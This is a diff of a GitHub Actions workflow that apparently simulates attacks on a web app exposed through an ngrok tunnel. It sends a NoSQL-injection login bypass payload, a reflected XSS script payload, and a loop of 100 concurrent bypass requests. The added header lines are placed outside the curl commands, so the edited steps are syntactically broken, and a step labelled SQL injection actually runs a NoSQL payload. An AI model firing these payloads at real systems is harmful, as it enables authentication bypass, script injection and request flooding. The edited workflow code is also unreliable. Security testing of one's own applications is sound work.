@@ -16,15 +16,18 @@ jobs:
       - name: Simulate SQL Injection Attack
         run: |
           echo "Executing NoSQL Injection Attack..."
+          -H "X-Simulated-By: GitHubAction" \
           curl -X POST https://9961-196-184-98-202.ngrok-free.app/login   -d 'username[$ne]=null&password[$ne]=null'
 
       - name: Simulate XSS Attack
         run: |
           echo "Executing Cross-Site Scripting (XSS) Attack..."
+          -H "X-Simulated-By: GitHubAction" \
           curl -X GET "https://9961-196-184-98-202.ngrok-free.app/search?query=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E"
       - name: Simulate Load Test (Ethical DoS)
         run: |
           echo "Simulating light DoS (load test)..."
+          -H "X-Simulated-By: GitHubAction" \
           for i in {1..100}; do
           curl -s -X POST https://9961-196-184-98-202.ngrok-free.app/login -d 'username[$ne]=null&password[$ne]=null' &
           done
